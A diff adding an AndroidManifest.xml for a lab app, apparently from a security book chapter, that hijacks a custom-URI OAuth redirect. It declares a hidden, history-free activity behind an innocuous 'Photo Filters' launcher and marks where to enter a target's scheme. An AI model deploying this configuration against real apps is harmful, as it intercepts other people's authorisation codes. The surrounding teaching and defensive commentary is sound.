@@ -1,0 +1,126 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  AndroidManifest.xml — the entire offensive capability of a scheme-hijacking app.
+
+  PURPOSE
+    Demonstrates that a custom URI scheme used as an OAuth redirect is not exclusive to the app
+    that "owns" it. Android imposes no uniqueness constraint on schemes:
+    IntentFilter.matchData (frameworks/base/core/java/android/content/IntentFilter.java) compares
+    scheme, host, port and path against the filter's declarations and has no concept of ownership,
+    no registry, and no first-claim priority.
+
+    There is no exploit code here. Declaring the filter IS the exploit.
+
+  AUTHORISED USE ONLY
+    Build this only for an app and account you own, or a target you have written authorisation to
+    test. Intercepting another person's authorisation code is unauthorised access to a computer
+    system in essentially every jurisdiction, and the fact that it takes fifteen lines is not a
+    defence. Keep it debug-signed, keep it on a test device, uninstall it afterwards.
+
+  BUILD
+    ./gradlew assembleDebug
+    adb install -r app/build/outputs/apk/debug/app-debug.apk
+
+  Chapter 45 — labs/lab-03-scheme-hijack.md
+-->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.research.hijacker">
+
+    <!-- Needed only for the exfiltration demonstration in HijackActivity; the interception
+         itself needs no permissions at all. That is worth noticing: this attack requires
+         nothing the user would ever be asked to approve. -->
+    <uses-permission android:name="android.permission.INTERNET" />
+
+    <!--
+      Android 11+ (API 30) package visibility. An app can no longer see arbitrary installed
+      packages, which is why the relay step in HijackActivity declares the target explicitly.
+      A real attacker adds the target here so setPackage() still resolves.
+    -->
+    <queries>
+        <package android:name="com.example.target" />
+    </queries>
+
+    <application
+        android:allowBackup="false"
+        android:icon="@mipmap/ic_launcher"
+        android:label="Photo Filters"
+        android:theme="@style/Theme.AppCompat.Light">
+
+        <!-- An innocuous-looking launcher activity, so the app appears to be what it claims. -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!--
+          THE HIJACK.
+
+          Attribute-by-attribute, and why an attacker chooses each one:
+
+            android:exported="true"
+                Required for another process (the browser) to start it. Since API 31 this must be
+                declared explicitly when an intent-filter is present.
+
+            android:theme="@android:style/Theme.NoDisplay"
+                No visible UI. The user sees nothing happen at all.
+
+            android:noHistory="true"
+                Nothing left in the back stack; pressing Back does not reveal it.
+
+            android:excludeFromRecents="true"
+                Nothing in the recents screen.
+
+            android:priority="999"
+                Filter priority influences ordering in some resolution paths. Do not rely on it —
+                the platform ignores priority for many implicit-intent cases — but attackers set
+                it, so recognise it when you see it in a manifest.
+
+            <data android:scheme="exampleapp" android:host="oauth" />
+                Change these to the target's redirect. Omitting android:host makes the filter
+                broader (it then matches ANY host on that scheme), which is what a real attacker
+                does when they do not know the exact callback path.
+        -->
+        <activity
+            android:name=".HijackActivity"
+            android:exported="true"
+            android:noHistory="true"
+            android:excludeFromRecents="true"
+            android:theme="@android:style/Theme.NoDisplay">
+
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.VIEW" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+
+                <!-- ===== EDIT THIS TO MATCH THE TARGET'S REDIRECT ===== -->
+                <data android:scheme="exampleapp" android:host="oauth" />
+            </intent-filter>
+
+            <!--
+              A second, broader filter. Uncomment to catch a target whose exact host or path you do
+              not know. Note that this catches EVERY app using that scheme, which is a useful
+              reminder of how blunt scheme registration is.
+            -->
+            <!--
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.VIEW" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <data android:scheme="exampleapp" />
+            </intent-filter>
+            -->
+
+            <!--
+              NOTE ON APP LINKS: you cannot do this to a VERIFIED https redirect. You may declare
+              the same host, but without a matching entry in that host's assetlinks.json the
+              platform will not treat your app as a verified handler, and the browser will not
+              offer it. That asymmetry is the entire argument for App Links, and it is worth
+              demonstrating in the lab by trying and failing.
+            -->
+        </activity>
+    </application>
+</manifest>
